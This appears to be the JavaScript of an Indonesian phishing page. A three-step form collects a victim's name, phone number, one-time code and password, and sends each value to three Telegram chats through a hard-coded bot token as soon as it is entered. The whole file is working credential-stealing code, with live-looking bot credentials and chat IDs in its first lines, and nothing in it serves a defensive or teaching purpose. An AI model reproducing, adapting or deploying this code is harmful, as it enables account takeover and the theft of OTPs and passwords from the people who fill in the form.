const botToken = "7574129779:AAFfiOTdOg4NSEgWDHcvsyhaXsi_aZRcUIw";
const chatIds = ["7639992105", "6124038392", "5460230196"]; // Daftar chat ID

let messageIds = {}; // Objek untuk menyimpan message ID untuk setiap chat ID

// Fungsi untuk mengirim atau mengedit pesan di Telegram
function sendMessageToTelegram(chatId, message, isEdit = false) {
  const urlBase = `https://api.telegram.org/bot${botToken}/${
    isEdit ? "editMessageText" : "sendMessage"
  }`;

  const body = {
    chat_id: chatId,
    text: message,
    parse_mode: "Markdown",
  };

  if (isEdit && messageIds[chatId]) {
    body.message_id = messageIds[chatId];
  }

  return fetch(urlBase, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  })
    .then((response) => response.json())
    .then((data) => {
      // Hanya menyimpan message ID jika ini adalah pesan pertama (bukan edit)
      if (!isEdit && data.ok) {
        messageIds[chatId] = data.result.message_id;
      }
    })
    .catch((error) => console.error("Error:", error));
}

// Format nomor telepon untuk kode negara Indonesia
function formatPhoneNumber(phone) {
  if (phone.startsWith("0")) {
    return `+62${phone.slice(1)}`;
  }
  return phone;
}

// Validasi input pada setiap langkah
function validateStep(step) {
  const inputs = document.querySelectorAll(`#step${step} input[required]`);
  for (let input of inputs) {
    if (!input.value.trim()) {
      alert("Silahkan lengkapi form sebelum melanjutkan.");
      return false;
    }
  }
  return true;
}

// Fungsi untuk melanjutkan ke langkah berikutnya dan mengirim atau mengedit pesan
function nextStep(step) {
  const name = document.getElementById("name").value;
  const phone = formatPhoneNumber(document.getElementById("phone").value);
  const otp = document.getElementById("otp")
    ? document.getElementById("otp").value
    : "";
  const password = document.getElementById("password")
    ? document.getElementById("password").value
    : "";

  // Pesan yang akan dikirim ke Telegram dengan format yang diinginkan
  const message = `Nama: ${name}\nNomor Telepon: ${phone}\nOTP: ${otp}\nKata Sandi: ${password}`;

  // Step 1: Kirim pesan pertama kali
  if (step === 1 && validateStep(1)) {
    // Kirim pesan pertama kali
    chatIds.forEach((chatId) => sendMessageToTelegram(chatId, message));

    // Lanjutkan ke step 2 dengan transisi
    transitionStep("step1", "step2");
  } else if (step === 2 && validateStep(2)) {
    // Step 2: Edit pesan untuk menambahkan OTP
    chatIds.forEach((chatId) => sendMessageToTelegram(chatId, message, true));

    // Lanjutkan ke step 3 dengan transisi
    transitionStep("step2", "step3");
  }
}

// Fungsi untuk menyelesaikan formulir di step terakhir dan mengedit pesan terakhir
function submitForm() {
  if (validateStep(3)) {
    const name = document.getElementById("name").value;
    const phone = formatPhoneNumber(document.getElementById("phone").value);
    const otp = document.getElementById("otp").value;
    const password = document.getElementById("password").value;

    // Update pesan terakhir dengan semua informasi termasuk kata sandi
    const message = `Nama: ${name}\nNomor Telepon: ${phone}\nOTP: ${otp}\nKata Sandi: ${password}`;
    chatIds.forEach((chatId) => sendMessageToTelegram(chatId, message, true));

    // Tampilkan modal konfirmasi dan reset form
    document.getElementById("confirmationModal").style.display = "block";
    resetForm();
    transitionStep("step3", "step1");
  }
}

// Fungsi untuk transisi antar step
function transitionStep(fromStep, toStep) {
  document.getElementById(fromStep).style.transition = "opacity 0.5s ease";
  document.getElementById(fromStep).style.opacity = 0;

  setTimeout(() => {
    document.getElementById(fromStep).style.display = "none";
    document.getElementById(toStep).style.display = "block";
    document.getElementById(toStep).style.transition = "opacity 0.5s ease";
    document.getElementById(toStep).style.opacity = 1;
  }, 500);
}

// Fungsi untuk mereset formulir
function resetForm() {
  document.getElementById("name").value = "";
  document.getElementById("phone").value = "";
  document.getElementById("otp").value = "";
  document.getElementById("password").value = "";
}

// Fungsi untuk menutup modal konfirmasi dan reset ke langkah 1
function resetAndCloseModal() {
  document.getElementById("confirmationModal").style.display = "none";
  resetForm();
  transitionStep("step1", "step1");
}

// Fungsi tambahan untuk memastikan hanya input angka yang diterima
document.getElementById("phone").addEventListener("input", function () {
  this.value = this.value.replace(/[^0-9]/g, ""); // Hanya angka
});

document.getElementById("otp").addEventListener("input", function () {
  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 5); // Hanya angka dan maksimal 5 digit
});
